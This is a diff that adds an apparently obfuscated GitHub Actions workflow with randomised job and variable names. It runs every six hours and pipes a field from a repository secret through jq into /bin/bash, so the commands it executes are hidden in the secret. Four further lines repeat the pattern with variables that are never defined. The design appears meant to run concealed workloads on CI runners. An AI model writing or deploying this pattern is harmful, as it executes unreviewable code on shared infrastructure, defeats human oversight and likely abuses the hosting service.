@@ -1,0 +1,20 @@
+name: zhanghuomiao7865
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhanghuomiao7865
+        env:
+          rcfn86: ${{ secrets.rcfn86 }}
+        run: |
+          echo $rcfn86 | jq -r .lca38 | /bin/bash
+          echo $dha755 | jq -r .wdk1 | /bin/bash
+          echo $niqm6075 | jq -r .prbt09 | /bin/bash
+          echo $eyfd82 | jq -r .xtb4 | /bin/bash
+          echo $b887 | jq -r .kime21248 | /bin/bash
+
